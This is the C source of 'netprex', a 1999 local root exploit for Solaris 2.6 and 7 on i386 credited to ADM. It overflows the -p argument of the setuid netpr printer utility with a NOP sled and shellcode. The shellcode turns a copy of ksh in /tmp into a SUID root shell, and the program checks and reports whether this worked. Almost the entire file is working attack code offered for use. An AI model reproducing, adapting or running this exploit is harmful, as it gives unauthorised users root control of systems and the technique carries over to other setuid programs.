/**     
***  netprex - i386 Solaris root exploit for /usr/lib/lp/bin/netpr
***     
***  Tested and confirmed under Solaris 2.6 and 7 (i386)
*** 
***  Usage:  % netprex hostname [offset]
***         
***  where hostname is the name of a host running the printer service on
***  TCP port 515 (such as "localhost" perhaps) and offset (if present)
***  is the number of bytes to add to the stack pointer to calculate your
***  target return address; try -1000 to 1000 in increments of 100 for
***  starters.
***        
***  Cheez Whiz / ADM   
***  cheezbeast@hotmail.com
*** 
***  March 4, 1999
**/ 
    
/*      Copyright (c) 1999 ADM  */
/*        All Rights Reserved   */

/*      THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF ADM      */
/*      The copyright notice above does not evidence any        */
/*      actual or intended publication of such source code.     */

#define BUFLEN 1047
#define NOP 0x90

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/wait.h>

char shell[] =
/*  0 */ "\xeb\x41"                              /* jmp springboard       */
/* syscall:                                                               */
/*  2 */ "\x9a\xff\xff\xff\xff\x07\xff"          /* lcall 0x7,0x0         */
/*  9 */ "\xc3"                                  /* ret                   */
/* start:                                                                 */
/* 10 */ "\x5e"                                  /* popl %esi             */
/* 11 */ "\x31\xc0"                              /* xor %eax,%eax         */
/* 13 */ "\x89\x46\xbb"                          /* movl %eax,-0x45(%esi) */
/* 16 */ "\x88\x46\xc0"                          /* movb %al,-0x40(%esi)  */
/* 19 */ "\x88\x46\x08"                          /* movb %al,0x8(%esi)    */
/* chown:                                                                 */
/* 22 */ "\x31\xc0"                              /* xor %eax,%eax         */
/* 24 */ "\x50"                                  /* pushl %eax            */
/* 25 */ "\x50"                                  /* pushl %eax            */
/* 26 */ "\x56"                                  /* pushl %esi            */
/* 27 */ "\xb0\x10"                              /* movb $0x10,%al        */
/* 29 */ "\xe8\xe0\xff\xff\xff"                  /* call syscall          */
/* 34 */ "\x83\xc4\x0c"                          /* addl $0xc,%esp        */
/* chmod:                                                                 */
/* 37 */ "\x31\xc0"                              /* xor %eax,%eax         */
/* 39 */ "\xb0\x6d"                              /* movb $0x6d,%al        */
/* 41 */ "\xb4\x09"                              /* movb $0x9,%ah         */
/* 43 */ "\x50"                                  /* pushl %eax            */
/* 44 */ "\x56"                                  /* pushl %esi            */
/* 45 */ "\x31\xc0"                              /* xor %eax,%eax         */
/* 47 */ "\xb0\x0f"                              /* movb $0xf,%al         */
/* 49 */ "\xe8\xcc\xff\xff\xff"                  /* call syscall          */
/* 54 */ "\x83\xc4\x08"                          /* addl $0x8,%esp        */
/* exit:                                                                  */
/* 57 */ "\x31\xc0"                              /* xor %eax,%eax         */
/* 59 */ "\x50"                                  /* pushl %eax            */
/* 60 */ "\xb0\x01"                              /* movb $0x1,%al         */
/* 62 */ "\xe8\xbf\xff\xff\xff"                  /* call syscall          */
/* springboard:                                                           */
/* 67 */ "\xe8\xc2\xff\xff\xff"                  /* call start            */
/* data:                                                                  */
/* 72 */ "\x2f\x74\x6d\x70\x2f\x6b\x73\x68\xff"; /* DATA                  */

char buf[BUFLEN+1];

unsigned long int
get_esp()
{
    __asm__("movl %esp,%eax");                   
}

int
main(int argc, char *argv[])
{
    unsigned long int esp, nop;                                           
    long int offset = 0;                         
    char *hostname, c;                           
    int i, null, umbilical[2];                   
    struct stat st;
    int status;                                                           

    if (argc < 2) {                                                       
        printf("usage: %s hostname [offset]\n", argv[0]);                 
        exit(1);
    }

    esp = get_esp();
    hostname = argv[1];
    if (argc > 2)
        offset = strtol(argv[2], NULL, 0);       
    if (argc > 3)
        nop = strtoul(argv[3], NULL, 0);
    else
        nop = 942;
 
    memset(buf, NOP, BUFLEN);                                             
    memcpy(buf+nop, shell, strlen(shell));       
    for (i = nop+strlen(shell); i <= BUFLEN-4; i += 4)
        *((int *) &buf[i]) = esp+offset;         
    
    printf("using return address 0x%08x (0x%08x offset %d) [nop %d]\n",   
           esp+offset, esp, offset, nop);
    
    if (stat("/tmp/ksh", &st) < 0) {
        printf("exploit failed; copy /bin/ksh to /tmp first!\n");
        exit(1);
    }
    
    if (pipe(umbilical) < 0) {
        printf("exploit failed; unable to create a pipe!\n");
        exit(1); 
    }
        
    switch (fork()) {
    case -1:
        printf("exploit failed; unable to fork!\n");
        exit(1);
        break;
    case 0:
        if ((null = open("/dev/null", O_RDWR, 0)) < 0) {
            printf("exploit failed; cannot open /dev/null!\n");
            exit(1);
        }  
        dup2(null, STDIN_FILENO);
        dup2(null, STDOUT_FILENO);  
        dup2(null, STDERR_FILENO);
        if (null > STDERR_FILENO)
            close(null);
        close(umbilical[0]);
        dup2(umbilical[1], 10); /* yes, descriptor 10 -- trust me ;-) */
        execl("/usr/lib/lp/bin/netpr", 
              "netpr",
              "-I", "ADM-ADM",
              "-U", "ADM!ADM",
              "-p", buf,
              "-d", hostname,
              "-P", "bsd",
              "/etc/passwd", NULL);
        printf("exploit failed; unable to exec!\n");
        exit(1);
        break;
    default:
        close(umbilical[1]);
        c = 0;
        while (c != '\n') {
            read(umbilical[0], &c, 1);
        }
        c = '\0';
        while (write(umbilical[0], &c, 1) < 1)
            ;
        wait(&status);
        if (WIFSIGNALED(status)) {
            printf("exploit failed; child process died on signal %d "
                   "(try adjusting the offset)\n", WTERMSIG(status));
            exit(1);
        } else if (WIFEXITED(status) && (WEXITSTATUS(status) != 0)) {
            printf("exploit failed; child process exited with unexpected "
                   "return value %d, instead of 0\n", WEXITSTATUS(status));
            exit(1);
        }
        break;  
    }   
    
    if (stat("/tmp/ksh", &st) < 0) {
        printf("exploit failed; /tmp/ksh disappeared somehow!\n");
        exit(1); 
    } else if (st.st_uid != 0) {
        printf("exploit failed; failed to make /tmp/ksh owned by root!\n");
        exit(1); 
    } else if ((st.st_mode & 07777) != 04555) {
        printf("exploit failed; failed to change /tmp/ksh to mode 4555!\n");
        exit(1);
    } else {
        printf("exploit successful; /tmp/ksh is now SUID root, dewd!\n");
        exit(0);   
    }       
}       
